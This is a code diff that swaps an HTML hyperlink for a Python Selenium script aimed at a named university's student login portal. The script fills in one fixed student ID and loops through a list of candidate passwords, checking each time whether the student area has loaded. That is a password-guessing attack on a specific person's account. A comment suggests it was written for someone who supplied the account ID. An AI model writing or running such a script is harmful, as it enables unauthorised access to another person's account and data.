@@ -1,1 +1,53 @@
-<a href=index.htm> This is my hyperlink
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
+import time
+
+# 設定 ChromeDriver
+driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
+
+# 開啟登入頁面
+driver.get("https://web.sys.scu.edu.tw/default.asp")
+
+# 等待頁面載入
+time.sleep(3)
+
+# 設定帳號
+username = "12111382"  # 這是你提供的帳號
+
+# 設定密碼的可能組合（每次錯誤後會自動換下一組密碼）
+passwords = ['password1', 'password2', 'password3', 'password4', 'password5']  # 可以在這裡填入更多密碼組合
+
+# 假設網站的帳號欄位名稱是 '學號或人事代碼'，密碼欄位名稱是 'password'
+username_field = driver.find_element(By.NAME, "學號或人事代碼")  # 這是帳號欄位的名稱
+password_field = driver.find_element(By.NAME, "密碼")  # 假設密碼欄位名稱為 'password'，根據實際情況調整
+
+# 模擬登入過程，每次換密碼
+for password in passwords:
+    # 輸入帳號和當前密碼
+    username_field.clear()  # 清空帳號欄位
+    password_field.clear()  # 清空密碼欄位
+    username_field.send_keys(username)
+    password_field.send_keys(password)
+
+    # 提交表單
+    password_field.send_keys(Keys.RETURN)
+
+    # 等待頁面載入
+    time.sleep(5)
+
+    # 檢查是否登入成功
+    if "學生專區" in driver.page_source:  # 根據登入後的頁面元素來判斷
+        print(f"登入成功，使用的密碼是: {password}")
+        break
+    else:
+        print(f"密碼錯誤，正在嘗試下一組密碼: {password}")
+
+# 如果密碼都錯誤，會告訴使用者
+if "學生專區" not in driver.page_source:
+    print("所有密碼嘗試都失敗了!")
+
+# 關閉瀏覽器
+driver.quit()
